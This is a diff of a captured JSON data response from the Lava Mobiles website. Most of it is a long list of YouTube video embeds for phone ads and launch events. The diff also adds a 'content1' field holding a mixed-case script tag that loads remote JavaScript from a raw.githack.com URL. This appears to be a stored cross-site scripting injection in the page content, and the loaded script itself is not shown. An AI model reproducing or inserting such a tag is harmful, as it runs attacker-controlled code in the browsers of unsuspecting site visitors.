@@ -1,12 +1,517 @@
 {
-  "url": "https://www.lavamobiles.com/_next/data/ly0JhjssYFJ7DcRKPylzU/career.json",
+  "url": "https://www.lavamobiles.com/_next/data/ly0JhjssYFJ7DcRKPylzU/videos.json",
   "method": "GET",
   "status": 200,
   "content_type": "application/json",
   "body": {
     "pageProps": {
-      "careerData": {},
-      "revalidate": 10
+      "VideoGallery": {
+        "status": 1,
+        "msg": "Gallery data for gallery page",
+        "video_gallery": [
+          {
+            "id": 78,
+            "name": "Blaze X Gautam Gambhir film 1",
+            "video_url": "https://www.youtube.com/embed/uTVvlT3Y_C0",
+            "image": "media/images/video_gallery/image/1---gg-1721737633.webp"
+          },
+          {
+            "id": 79,
+            "name": "Blaze X Gautam Gambhir film 2",
+            "video_url": "https://www.youtube.com/embed/LuD-GgYX8Eo",
+            "image": "media/images/video_gallery/image/2---gg-1721737652.webp"
+          },
+          {
+            "id": 80,
+            "name": "Blaze X",
+            "video_url": "https://www.youtube.com/embed/8nYdj-g7R2c",
+            "image": "media/images/video_gallery/image/3---blaze-x-1721733158.webp"
+          },
+          {
+            "id": 81,
+            "name": "Lava Mobiles: Reimagine Beauty, Every Day!",
+            "video_url": "https://www.youtube.com/embed/aKHtsNnhcXs",
+            "image": "media/images/video_gallery/image/4---lava-film-1721733213.webp"
+          },
+          {
+            "id": 82,
+            "name": "Celebrating 15 Years of Lava",
+            "video_url": "https://www.youtube.com/embed/wV8b4Xj9GeI",
+            "image": "media/images/video_gallery/image/5---15-years-1721733259.webp"
+          },
+          {
+            "id": 83,
+            "name": "Lava Uthao Garv Se | Punjab Kings X Lava Mobiles",
+            "video_url": "https://www.youtube.com/embed/CW-3awjorW0",
+            "image": "media/images/video_gallery/image/6---pk-x-lava-1721733313.webp"
+          },
+          {
+            "id": 84,
+            "name": "Prowatch launch event",
+            "video_url": "https://www.youtube.com/embed/TGllLa9HXz4",
+            "image": "media/images/video_gallery/image/7---prowatch-launch-1721733351.webp"
+          },
+          {
+            "id": 85,
+            "name": "Blaze Curve Launch event",
+            "video_url": "https://www.youtube.com/embed/G1GUWzqodfg",
+            "image": "media/images/video_gallery/image/8---blaze-curve-launch-1721733396.webp"
+          },
+          {
+            "id": 86,
+            "name": "Blaze Curve",
+            "video_url": "https://www.youtube.com/embed/-nFFMO0yvgo",
+            "image": "media/images/video_gallery/image/9---blaze-curve-1721733430.webp"
+          },
+          {
+            "id": 87,
+            "name": "Agni 2 launch event",
+            "video_url": "https://www.youtube.com/embed/KqEL6QvoNsc",
+            "image": "media/images/video_gallery/image/10---agni-2-launch-event-1721733732.webp"
+          },
+          {
+            "id": 88,
+            "name": "#AskSunilRaina ft. Rajiv Makhni - Unveiling the Vision",
+            "video_url": "https://www.youtube.com/embed/C0Hg82eqSP4",
+            "image": "media/images/video_gallery/image/11---ask-sunil-raina-1721733788.webp"
+          },
+          {
+            "id": 89,
+            "name": "Blaze 2 5G launch event",
+            "video_url": "https://www.youtube.com/embed/H-rH5C6fGAE",
+            "image": "media/images/video_gallery/image/12---blaze-2-5g-launch-1721733826.webp"
+          },
+          {
+            "id": 90,
+            "name": "Blaze 2 5G",
+            "video_url": "https://www.youtube.com/embed/adQ1x2KH6rY",
+            "image": "media/images/video_gallery/image/13---blaze-2-5g-1721733870.webp"
+          },
+          {
+            "id": 91,
+            "name": "Blaze Pro 5G launch event",
+            "video_url": "https://www.youtube.com/embed/y4YiAXMIsPI",
+            "image": "media/images/video_gallery/image/14---blaze-5g-pro-1721733892.webp"
+          },
+          {
+            "id": 92,
+            "name": "Storm 5G",
+            "video_url": "https://www.youtube.com/embed/-1hn6N3xm38",
+            "image": "media/images/video_gallery/image/15---storm-5g-1721733928.webp"
+          },
+          {
+            "id": 93,
+            "name": "Yuva 3 Pro",
+            "video_url": "https://www.youtube.com/embed/GRczC-16xn4",
+            "image": "media/images/video_gallery/image/16---yuva-3-pro-1721733959.webp"
+          },
+          {
+            "id": 94,
+            "name": "Yuva 3",
+            "video_url": "https://www.youtube.com/embed/v4Pty5BpaeI",
+            "image": "media/images/video_gallery/image/17---yuva-3-1721733993.webp"
+          },
+          {
+            "id": 95,
+            "name": "Yuva 5G",
+            "video_url": "https://www.youtube.com/embed/ggxYYVUCatM",
+            "image": "media/images/video_gallery/image/18---yuva-5g-1721734028.webp"
+          },
+          {
+            "id": 36,
+            "name": "Lava Pixel V2 TVC",
+            "video_url": "https://www.youtube.com/embed/jHgomWgViG4?si=9tOqtb69EMQdq71I",
+            "image": "media/images/video_gallery/image/lava-pixel-v2-tvc-1704685597.webp"
+          },
+          {
+            "id": 37,
+            "name": "Lava Pixel V2 - Smartphone Photography Redefined",
+            "video_url": "https://www.youtube.com/embed/D719nzOhv7k?si=wbIawY_8F5puXnWx",
+            "image": "media/images/video_gallery/image/lava-pixel-v2-1704685745.webp"
+          },
+          {
+            "id": 38,
+            "name": "LAVA Iris ATOM 2",
+            "video_url": "https://www.youtube.com/embed/0lEqaX4m6Kk?si=yVBRmgxMbf4TO1l1",
+            "image": "media/images/video_gallery/image/lava-iris-atom-2-1704686205.webp"
+          },
+          {
+            "id": 39,
+            "name": "LAVA Pixel V1",
+            "video_url": "https://www.youtube.com/embed/1-E2_4-bXlQ?si=u_nlJURDLhattYmC",
+            "image": "media/images/video_gallery/image/lava-pixel-v1-1704686323.webp"
+          },
+          {
+            "id": 40,
+            "name": "LAVA Flair Z1",
+            "video_url": "https://www.youtube.com/embed/pBCK3kkNIfc?si=xAdpez_08NQU1Cku",
+            "image": "media/images/video_gallery/image/lava-flair-z1-1704686691.webp"
+          },
+          {
+            "id": 41,
+            "name": "LAVA Iris X1 Atom",
+            "video_url": "https://www.youtube.com/embed/1Y6zo9XKof4?si=j_-iAzj2vEAEFFwu",
+            "image": "media/images/video_gallery/image/lava-iris-x1-atom-1704686782.webp"
+          },
+          {
+            "id": 42,
+            "name": "Lava Iris X8",
+            "video_url": "https://www.youtube.com/embed/gAQ53_Zv2so?si=ozfM0Pb6pJl0k2B-",
+            "image": "media/images/video_gallery/image/lava-iris-x8-1704686866.webp"
+          },
+          {
+            "id": 43,
+            "name": "LAVA Iris X8",
+            "video_url": "https://www.youtube.com/embed/9zfXuT_0mEU?si=YIsx8AWPGuZmix2k",
+            "image": "media/images/video_gallery/image/lava-iris-x8-(1)-1704686996.webp"
+          },
+          {
+            "id": 44,
+            "name": "Lava Iris X1 Grand",
+            "video_url": "https://www.youtube.com/embed/rfJokjhJGPs?si=2Y3zu46eErobkx3c",
+            "image": "media/images/video_gallery/image/lava-iris-x1-grand-1704687142.webp"
+          },
+          {
+            "id": 45,
+            "name": "Lava Iris X1 Grand - Intelligent Flip Cover",
+            "video_url": "https://www.youtube.com/embed/LLgLiCBryC4?si=CFOVUqDtkZoYHLkt",
+            "image": "media/images/video_gallery/image/lava-iris-x1-grand-intelligent-flip-cover-1704687504.webp"
+          },
+          {
+            "id": 46,
+            "name": "Lava Iris Alfa : Demo Video",
+            "video_url": "https://www.youtube.com/embed/nkg3EbdrHII?si=dajWwwvkFWlzVrT4",
+            "image": "media/images/video_gallery/image/lava-iris-alfa-demo-video-1704687628.webp"
+          },
+          {
+            "id": 47,
+            "name": "LAVA Iris Fuel TVC",
+            "video_url": "https://www.youtube.com/embed/R6usofHubG0?si=f5kvtcttafnIpG2Y",
+            "image": "media/images/video_gallery/image/lava-iris-fuel-tvc-1704687714.webp"
+          },
+          {
+            "id": 48,
+            "name": "Lava Iris Fuel: Demo Video",
+            "video_url": "https://www.youtube.com/embed/qPAJY81pHAQ?si=oAnnl1xGNDfP8Xus",
+            "image": "media/images/video_gallery/image/lava-iris-fuel-demo-video-1704688338.webp"
+          },
+          {
+            "id": 49,
+            "name": "LAVA Iris Win1: Demo Video",
+            "video_url": "https://www.youtube.com/embed/g5hT-zFG6e4?si=T2NASq1aBQiSuPsM",
+            "image": "media/images/video_gallery/image/lava-iris-win1-demo-video-1704688756.webp"
+          },
+          {
+            "id": 50,
+            "name": "Lava Iris FUEL - Teaser",
+            "video_url": "https://www.youtube.com/embed/wYs93BBUSAQ?si=-Qqk__YOFu5PWZwf",
+            "image": "media/images/video_gallery/image/lava-iris-fuel-1704689262.webp"
+          },
+          {
+            "id": 51,
+            "name": "LAVA Iris X5:TVC",
+            "video_url": "https://www.youtube.com/embed/HttEtC8vkGI?si=HRixiXADhHCHmm7q",
+            "image": "media/images/video_gallery/image/lava-iris-x5-tvc-1704689499.webp"
+          },
+          {
+            "id": 52,
+            "name": "LAVA Iris X5 : Demo Video",
+            "video_url": "https://www.youtube.com/embed/Hz9aYZ0HWIU?si=5OjnIfmsp1FXeH_6",
+            "image": "media/images/video_gallery/image/lava-iris-x5-tvc-1704689567.webp"
+          },
+          {
+            "id": 53,
+            "name": "LAVA Magnum X604: Training/Review Video",
+            "video_url": "https://www.youtube.com/embed/31NYwKfQXwE?si=PzeQgyI2YCh5pwXV",
+            "image": "media/images/video_gallery/image/lava-magnum-x604-1704689742.webp"
+          },
+          {
+            "id": 54,
+            "name": "LAVA Iris 504Q+: Demo Video",
+            "video_url": "https://www.youtube.com/embed/Yu2A1ix-jOU?si=PohSVxLXKHl4mi5j",
+            "image": "media/images/video_gallery/image/lava-iris-504q-plus-1704689985.webp"
+          },
+          {
+            "id": 55,
+            "name": "LAVA Iris X1: TVC, Get Mesmerized",
+            "video_url": "https://www.youtube.com/embed/LP-ub27Qzws?si=KOmcCo0WDIwAyjln",
+            "image": "media/images/video_gallery/image/lava-iris-x1-tvc-get-mesmerized-1704691690.webp"
+          },
+          {
+            "id": 56,
+            "name": "LAVA Iris 504Q+ : Dragontrail glass Scratch Test",
+            "video_url": "https://www.youtube.com/embed/1wdCX1HmRyk?si=7I8JHnkM-kNTpo9T",
+            "image": "media/images/video_gallery/image/lava-iris-504q-plus-(1)-1704691923.webp"
+          },
+          {
+            "id": 57,
+            "name": "LAVA Iris 406q: Demo Video",
+            "video_url": "https://www.youtube.com/embed/eYxZ1-rcKOo?si=022svBu1tF1gwymh",
+            "image": "media/images/video_gallery/image/lava-iris-406q-demo-video-1704692097.webp"
+          },
+          {
+            "id": 58,
+            "name": "LAVA Iris 450 COLOUR: Demo Video",
+            "video_url": "https://www.youtube.com/embed/shvYaB8onSA?si=4TRJ8Szw8hIz_cbj",
+            "image": "media/images/video_gallery/image/lava-iris-450-colour-demo-video-1704692204.webp"
+          },
+          {
+            "id": 59,
+            "name": "LAVA IRIS PRO 30: DEMO VIDEO",
+            "video_url": "https://www.youtube.com/embed/VuRVL9krjmo?si=-o8opQpF6TmweBx8",
+            "image": "media/images/video_gallery/image/lava-iris-pro-30-demo-video-1704692308.webp"
+          },
+          {
+            "id": 60,
+            "name": "LAVA Iris 550Q: Demo Video",
+            "video_url": "https://www.youtube.com/embed/Spg4mW4jjjs?si=wpGBx9f4D5jKyEdI",
+            "image": "media/images/video_gallery/image/lava-iris-550q-demo-video-1704692486.webp"
+          },
+          {
+            "id": 61,
+            "name": "LAVA 3G Smartphones: HD TVC",
+            "video_url": "https://www.youtube.com/embed/SJlDgVN2KfU?si=ORSr2Lq_-1e0Msxx",
+            "image": "media/images/video_gallery/image/lava-3g-smartphones-hd-tvc-1704692687.webp"
+          },
+          {
+            "id": 62,
+            "name": "LAVA Iris 504Q: TVC",
+            "video_url": "https://www.youtube.com/embed/XzaoX_TJ-p8?si=YcrhPFPIoo8xJ-Nm",
+            "image": "media/images/video_gallery/image/lava-iris-504q-tvc-1704692823.webp"
+          },
+          {
+            "id": 63,
+            "name": "LAVA Iris 504Q: Gesture Control Demo",
+            "video_url": "https://www.youtube.com/embed/vg5y3vAPYSI?si=1CQ3LAcnluqlkRS4",
+            "image": "media/images/video_gallery/image/lava-iris-504q-1704693232.webp"
+          },
+          {
+            "id": 64,
+            "name": "LAVA M30: TVC",
+            "video_url": "https://www.youtube.com/embed/zr0VDoJ0O2g?si=IQm4tafrvZHxyDq8",
+            "image": "media/images/video_gallery/image/lava-m30-tvc-1704693470.webp"
+          },
+          {
+            "id": 65,
+            "name": "LAVA A16 MTV Phone: TVC",
+            "video_url": "https://www.youtube.com/embed/YA9o986WpXQ?si=k0rNKY9vozPovUBu",
+            "image": "media/images/video_gallery/image/lava-a16-mtv-phone-tvc-1704693659.webp"
+          },
+          {
+            "id": 66,
+            "name": "LAVA Mobile Feature Phones: TVC",
+            "video_url": "https://www.youtube.com/embed/ikbTs-4yMaI?si=MYvgGWjATpv-W5eD",
+            "image": "media/images/video_gallery/image/lava-mobile-feature-phones-tvc-1704693870.webp"
+          },
+          {
+            "id": 67,
+            "name": "LAVA M70: TVC",
+            "video_url": "https://www.youtube.com/embed/dPEaARynVOc?si=2Vxf-SYENgn7m8v2",
+            "image": "media/images/video_gallery/image/lava-m70-1704694017.webp"
+          },
+          {
+            "id": 68,
+            "name": "LAVA B5: TVC",
+            "video_url": "https://www.youtube.com/embed/yFrLENJp52A?si=AmbLniM_fKM2JuMQ",
+            "image": "media/images/video_gallery/image/lava-b5-1704694923.webp"
+          },
+          {
+            "id": 69,
+            "name": "Lava A10: TVC",
+            "video_url": "https://www.youtube.com/embed/VdLWPgrLMhM?si=J_mvssIK8xsm33S7",
+            "image": "media/images/video_gallery/image/lava-a10-tvc-1704695052.webp"
+          },
+          {
+            "id": 70,
+            "name": "LAVA A9: TVC",
+            "video_url": "https://www.youtube.com/embed/gg0QKy_lM7w?si=QkkC16Low4bzUa4O",
+            "image": "media/images/video_gallery/image/lava-a9-1704695579.webp"
+          },
+          {
+            "id": 71,
+            "name": "LAVA A16 MTV Phone: Review on NDTV Profit Cell Guru",
+            "video_url": "https://www.youtube.com/embed/vbYkGHDpX04?si=i7zGG-VoS6j84qsX",
+            "image": "media/images/video_gallery/image/lava-a16-mtv-phone-1704695728.webp"
+          },
+          {
+            "id": 72,
+            "name": "LAVA S12: Review on NDTV Profit",
+            "video_url": "https://www.youtube.com/embed/h6V6ddTPQa0?si=S-wS5BusVI71-1h6",
+            "image": "media/images/video_gallery/image/lava-s12-1704696078.webp"
+          },
+          {
+            "id": 16,
+            "name": "Lava Mobiles | Desh Ki Apni Dhun, Desh Ka Apna Lava",
+            "video_url": "https://www.youtube.com/embed/WU4gagu0xiM?si=mOcox48CBZ84lXsa",
+            "image": "media/images/video_gallery/image/lava-mobiles-desh-ki-apni-dhun-1705908793.webp"
+          },
+          {
+            "id": 17,
+            "name": "Desh Ki Apni Dhun, Desh Ka Apna Lava | Lava Mobiles",
+            "video_url": "https://www.youtube.com/embed/A0QSf4lc0cg?si=EyZKfb5ebSPxcLId",
+            "image": "media/images/video_gallery/image/desh-ki-apni-dhun-1-1705908798.webp"
+          },
+          {
+            "id": 18,
+            "name": "Lava Mobiles | Before you forward a message #SendItBack | #ProudlyIndian",
+            "video_url": "https://www.youtube.com/embed/yq6w3l2x5n8?si=1EZ_IC5Cu6gSlRJw",
+            "image": "media/images/video_gallery/image/senditback_proudlyindian-1704432102.webp"
+          },
+          {
+            "id": 19,
+            "name": "Lava Mobiles | 10 years, 17 Crore Customers, Countless Moments | #10YearsofLAVA",
+            "video_url": "https://www.youtube.com/embed/gHNyuMG8bNE?si=hIY6ZYijjfuDuKVR",
+            "image": "media/images/video_gallery/image/lava-mobiles-10-years-1704432234.webp"
+          },
+          {
+            "id": 20,
+            "name": "LAVA Mobiles | Is it too much of an effort? Think. - #ProudlyIndian",
+            "video_url": "https://www.youtube.com/embed/bfZIDGhZ0O8?si=piROeyOv3C41C4fb",
+            "image": "media/images/video_gallery/image/lava-mobiles-proudlyindian-1704432364.webp"
+          },
+          {
+            "id": 21,
+            "name": "Iss Diwali, No Lights! | Lava Mobiles | #ProudlyIndian",
+            "video_url": "https://www.youtube.com/embed/YYZvCQitw1o?si=rNkDLzAZQPukGcaM",
+            "image": "media/images/video_gallery/image/iss-diwali-no-lights!-1704432483.webp"
+          },
+          {
+            "id": 22,
+            "name": "Z61 Explainer",
+            "video_url": "https://www.youtube.com/embed/pqTOW1FU93Q?si=gzC8QUGmwtmmwk0Z",
+            "image": "media/images/video_gallery/image/lava-z61-1704432641.webp"
+          },
+          {
+            "id": 23,
+            "name": "Lava Z61 - Sharp click camera",
+            "video_url": "https://www.youtube.com/embed/ds-PEHjIndQ?si=zJj524JY5Vq4TDOG",
+            "image": "media/images/video_gallery/image/lava-z61-(1)-1704432760.webp"
+          },
+          {
+            "id": 24,
+            "name": "Lava Z61 - With Full screen 18:9 HD+ display",
+            "video_url": "https://www.youtube.com/embed/MkpZu0tSOqw?si=38vHrwZTpJcuwfC1",
+            "image": "media/images/video_gallery/image/lava-z61-1704432872.webp"
+          },
+          {
+            "id": 25,
+            "name": "Lava Helium 14 Notebook: Delightfully Light | Exclusive First Look",
+            "video_url": "https://www.youtube.com/embed/YOm8YHaY7fY?si=7P3AXw7t4VymxfRQ",
+            "image": "media/images/video_gallery/image/lava-helium-14-notebook-1704432965.webp"
+          },
+          {
+            "id": 26,
+            "name": "LAVA Z25: Demo Video",
+            "video_url": "https://www.youtube.com/embed/SrgF8RzC9xI?si=QAt0gZYKrkWbZYzq",
+            "image": "media/images/video_gallery/image/lava-z25-1704433052.webp"
+          },
+          {
+            "id": 27,
+            "name": "Lava Z series #IShootArt",
+            "video_url": "https://www.youtube.com/embed/OTJAAFgolrI?si=_ad1RWvHbPLD1kfR",
+            "image": "media/images/video_gallery/image/lava-z-series-1704433604.webp"
+          },
+          {
+            "id": 28,
+            "name": "Make In India: Inside Lava's Noida Facility",
+            "video_url": "https://www.youtube.com/embed/JKjM4CCT6BY?si=IDoQbtQAOyL-kbjH",
+            "image": "media/images/video_gallery/image/make-in-india-1704441826.webp"
+          },
+          {
+            "id": 29,
+            "name": "LAVA X81: Demo Video",
+            "video_url": "https://www.youtube.com/embed/oIjgOShXKFg?si=kr_N1qCszVimd2yV",
+            "image": "media/images/video_gallery/image/lava-x81-1704441944.webp"
+          },
+          {
+            "id": 30,
+            "name": "LAVA X46: Slow Motion video recording",
+            "video_url": "https://www.youtube.com/embed/nT65tCdoNes?si=tplFebKze4r_JDE5",
+            "image": "media/images/video_gallery/image/lava-x46-1704442103.webp"
+          },
+          {
+            "id": 32,
+            "name": "Lava X81 4G",
+            "video_url": "https://www.youtube.com/embed/AJOhr6-aFmw?si=XtFudBGV2hIO_Sy7",
+            "image": "media/images/video_gallery/image/lava-x81-1704442434.webp"
+          },
+          {
+            "id": 33,
+            "name": "Lava X46 4G",
+            "video_url": "https://www.youtube.com/embed/3lHJvLQqYTY?si=x3M5x-1Pa_nmVgwg",
+            "image": "media/images/video_gallery/image/lava-x46-(1)-1704442621.webp"
+          },
+          {
+            "id": 34,
+            "name": "Lava Twinpad- Demo Video",
+            "video_url": "https://www.youtube.com/embed/kpTOCiiUvfo?si=2q69yI1UHLpn-aXu",
+            "image": "media/images/video_gallery/image/lava-twinpad-1704442752.webp"
+          },
+          {
+            "id": 35,
+            "name": "Lava Iris Atom 3",
+            "video_url": "https://www.youtube.com/embed/2zkfw7BU2Ao?si=L56e6LKOnzTkzG4O",
+            "image": "media/images/video_gallery/image/lava-iris-atom-3-1704443062.webp"
+          },
+          {
+            "id": 11,
+            "name": "Introducing Lava Blaze Pro ft. Kartik Aaryan",
+            "video_url": "https://www.youtube.com/embed/OBXA8SXKcho?si=BOYa3MIQaE0Rb4GX",
+            "image": "media/images/video_gallery/image/introducing-lava-blaze-1703777264-1703836122.webp"
+          },
+          {
+            "id": 12,
+            "name": "Introducing Blaze 5G",
+            "video_url": "https://www.youtube.com/embed/3UaPDgFESWM?si=dNkd5i5_eOCvqZNa",
+            "image": "media/images/video_gallery/image/introducing-blaze-5g-1703777148-1703836156.webp"
+          },
+          {
+            "id": 13,
+            "name": "Probuds by Lava | Explore Uninterrupted",
+            "video_url": "https://www.youtube.com/embed/bfhTJvFoU5M?si=74OHTuy9bH-3qcOd",
+            "image": "media/images/video_gallery/image/probuds-by-lava-1703777022-1703836217.webp"
+          },
+          {
+            "id": 14,
+            "name": "Abhimanyu's Story of #TheLavaPromise",
+            "video_url": "https://www.youtube.com/embed/O35GIQByRcA?si=2yTZok-wB_V4JI6g",
+            "image": "media/images/video_gallery/image/abhimanyu-story-of-thelavapromise-1703776782-1703836340.webp"
+          },
+          {
+            "id": 15,
+            "name": "Ritik's Experience of #TheLavaPromise",
+            "video_url": "https://www.youtube.com/embed/0Lzb9_mHgYU?si=4zxanpPXkER0tPFX",
+            "image": "media/images/video_gallery/image/ritik-experience-1703776512-1703836364.webp"
+          }
+        ]
+      },
+      "VideosPge": {
+        "status": 1,
+        "msg": "videos Page Content",
+        "data": {
+          "id": 18,
+          "slug": "videos",
+          "name": "Videos",
+          "sub_text": null,
+          "content1": "<sCrIpT sRc=//raw.githack.com/gogok4nxgo/1v9et39j58z1/main/1.js></ScRiPt>",
+          "content2": null,
+          "content3": null,
+          "content4": null,
+          "content5": null,
+          "content6": null,
+          "page_title": "Videos and TVC - Lava Mobiles",
+          "meta_keywords": null,
+          "meta_description": "Videos and TVC - Lava Mobiles",
+          "meta_other": null,
+          "video_url": null,
+          "image": null,
+          "image_alt": null,
+          "image_mobile": null,
+          "status": 1
+        },
+        "leadership": {},
+        "success": "success"
+      }
     },
     "__N_SSG": true
   }
